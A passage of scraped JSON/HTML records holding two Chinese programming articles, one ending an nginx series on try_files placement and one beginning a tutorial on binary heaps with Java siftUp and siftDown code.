style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32fe668932049-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32fe668932049-1\"><span class=\"crayon-v\">try</span><span class=\"crayon-sy\">_</span>files <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">uri</span> <span class=\"crayon-v\">index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">html</span> <span class=\"crayon-o\">=</span><span class=\"crayon-cn\">404</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>所以对于 <code>/foo.html</code> 请求，它将尝试按以下顺序返回文件：</p>\n<ol>\n<li>$uri ( /foo.html )</li>\n<li>index.html</li>\n<li>如果什么都没找到则返回 404</li>\n</ol>\n<p>有趣的是，如果我们在服务器上下文中定义 try_files，然后定义匹配的所有请求的 location —— try_files 将不会执行。</p>\n<p>这是因为在服务器上下文中定义的 try_files 是它的 pseudo-location，这是最不可能的位置。因此，定义 location/ 将比 pseudo-location 更具体。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d3301654125134\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nserver {\r\n  try_files $uri /index.html =404;\r\n\r\n  location / {\r\n  }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d3301654125134-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d3301654125134-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d3301654125134-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d3301654125134-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d3301654125134-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d3301654125134-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d3301654125134-1\"><span class=\"crayon-e\">server</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d3301654125134-2\">  <span class=\"crayon-v\">try</span><span class=\"crayon-sy\">_</span>files <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">uri</span> <span class=\"crayon-o\">/</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">html</span> <span class=\"crayon-o\">=</span><span class=\"crayon-cn\">404</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d3301654125134-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d3301654125134-4\">  <span class=\"crayon-e\">location</span> <span class=\"crayon-o\">/</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d3301654125134-5\">  <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d3301654125134-6\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>因此，你应该避免在 server 上下文中出现 try_files:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d3307511320974\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nserver {\r\n  location / {\r\n    try_files $uri /index.html =404;\r\n  }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d3307511320974-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d3307511320974-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d3307511320974-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d3307511320974-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d3307511320974-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d3307511320974-1\"><span class=\"crayon-e\">server</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d3307511320974-2\">  <span class=\"crayon-e\">location</span> <span class=\"crayon-o\">/</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d3307511320974-3\">    <span class=\"crayon-v\">try</span><span class=\"crayon-sy\">_</span>files <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">uri</span> <span class=\"crayon-o\">/</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">html</span> <span class=\"crayon-o\">=</span><span class=\"crayon-cn\">404</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d3307511320974-4\">  <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d3307511320974-5\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p>\n<h2>总结</h2>\n<p>感谢您的阅读。如果没有大量的资源，这个系列是不可能完成的。在这一系列的写作中，我们发现了一些特别有用的网站：</p>\n<ul>\n<li><a href=\"https://nginx.org/en/docs/\" target=\"_blank\" rel=\"nofollow\">nginx 文档</a></li>\n<li><a href=\"https://www.nginx.com/blog/\" target=\"_blank\" rel=\"nofollow\">nginx 博客</a></li>\n<li><a href=\"https://www.udemy.com/nginx-fundamentals/\" target=\"_blank\" rel=\"nofollow\">udemy（在线教育网站 ）的 nginx 原理教程</a></li>\n<li><a href=\"https://www.igvita.com/\" target=\"_blank\" rel=\"nofollow\">Ilya Grigorik 的博客</a>，和他的令人惊奇的书：<a href=\"https://hpbn.co/\" target=\"_blank\" rel=\"nofollow\">《高性能浏览器网络》</a></li>\n<li><a href=\"https://blog.martinfjordvald.com/\" target=\"_blank\" rel=\"nofollow\">Martin Fjordvald 的博客</a></li>\n</ul>\n<p>我们会很感激你的反馈和评价，请随意讨论。你喜欢这系列吗？你有什么关于下一步应该解决什么问题的建议吗？或你发现了一个错误？告诉我们，下期再见。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113555\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113555votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113555\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 6 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/10/a1a4de99de0c75eab712542a7dac876f.png"], "title": "堆和堆的应用：堆排序和优先队列", "fav_nums": 1, "url": "http://blog.jobbole.com/113552/", "create_date": "2018/01/28", "url_object_id": "52d97c6c8aa1a7c2bb78185a52c636de", "comment_nums": 0, "front_image_path": "full/30fcdf79d0b901a9dde107f5e6e10f11fd95d574.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://spground.github.io/2017/07/07/%E5%A0%86%E5%92%8C%E5%A0%86%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%9A%E5%A0%86%E6%8E%92%E5%BA%8F%E5%92%8C%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97/\">Spground</a>   </div><h2 id=\"1-堆\">1.堆</h2>\n<p><a href=\"https://en.wikipedia.org/wiki/Heap_(data_structure\" target=\"_blank\" rel=\"noopener\">堆(Heap)</a>)是一种重要的数据结构，是实现<a href=\"https://en.wikipedia.org/wiki/Priority_queue\" target=\"_blank\" rel=\"noopener\">优先队列(Priority Queues)</a>首选的数据结构。由于堆有很多种变体，包括二项式堆、斐波那契堆等，但是这里只考虑最常见的就是二叉堆（以下简称堆）。</p>\n<p>堆是一棵满足一定性质的二叉树，具体的讲堆具有如下性质：<strong>父节点的键值总是不大于它的孩子节点的键值（小顶堆）</strong>, 堆可以分为<strong>小顶堆</strong>和<strong>大顶堆</strong>，这里以<strong>小顶堆</strong>为例，其主要包含的操作有：</p>\n<ul>\n<li>insert()</li>\n<li>extractMin</li>\n<li>peek(findMin)</li>\n<li>delete(i)</li>\n</ul>\n<p>由于堆是一棵形态规则的二叉树，因此堆的父节点和孩子节点存在如下关系：</p>\n<blockquote><p><strong>设父节点的编号为 <code>i</code>, 则其左孩子节点的编号为<code>2*i+1</code>, 右孩子节点的编号为<code>2*i+2</code></strong><br>\n<strong>设孩子节点的编号为<code>i</code>, 则其父节点的编号为<code>(i-1)/2</code></strong></p></blockquote>\n<p>由于二叉树良好的形态已经包含了父节点和孩子节点的关系信息，因此就可以不使用链表而简单的使用数组来存储堆。</p>\n<p>要实现堆的基本操作，涉及到的两个关键的函数</p>\n<ul>\n<li><code>siftUp(i, x)</code> ： 将位置<code>i</code>的元素<code>x</code>向上调整，以满足堆得性质，常常是用于<code>insert</code>后，用于调整堆；</li>\n<li><code>siftDown(i, x)</code>：同理，常常是用于<code>delete(i)</code>后，用于调整堆；</li>\n</ul>\n<p>具体的操作如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38743a781477562838\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nprivate void siftUp(int i) {\r\n\tint key = nums[i];\r\n\tfor (; i &gt; 0;) {\r\n\t\tint p = (i - 1) &gt;&gt;&gt; 1;\r\n\t\tif (nums[p] &lt;= key)\r\n\t\t\tbreak;\r\n\t\tnums[i] = nums[p];\r\n\t\ti = p;\r\n\t}\r\n\tnums[i] = key;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a781477562838-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a781477562838-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a781477562838-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a781477562838-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a781477562838-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a781477562838-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a781477562838-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a781477562838-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a781477562838-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a781477562838-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a781477562838-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38743a781477562838-1\"><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">siftUp</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a781477562838-2\"><span class=\"crayon-h\">\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a781477562838-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a781477562838-4\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a781477562838-5\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a781477562838-6\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a781477562838-7\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a781477562838-8\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a781477562838-9\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a781477562838-10\"><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a781477562838-11\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38743a78c354208293\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nprivate void siftDown(int i) {\r\n\t\tint key = nums[i];\r\n\t\tfor (;i &lt; nums.length / 2;) {\r\n\t\t\tint child = (i &lt;&lt; 1) + 1;\r\n\t\t\tif (child + 1 &lt; nums.length &amp;&amp; nums[child] &gt; nums[child+1])\r\n\t\t\t\tchild++;\r\n\t\t\tif (key &lt;= nums[child])\r\n\t\t\t\tbreak;\r\n\t\t\tnums[i] = nums[child];\r\n\t\t\ti = child;\r\n\t\t}\r\n\t\tnums[i] = key;\r\n  }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a78c354208293-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a78c354208293-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a78c354208293-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a78c354208293-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a78c354208293-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a78c354208293-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a78c354208293-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a78c354208293-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a78c354208293-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a78c354208293-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a78c354208293-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a78c354208293-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a78c354208293-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38743a78c354208293-1\"><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">siftDown</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a78c354208293-2\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a78c354208293-3\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a78c354208293-4\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">child</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" 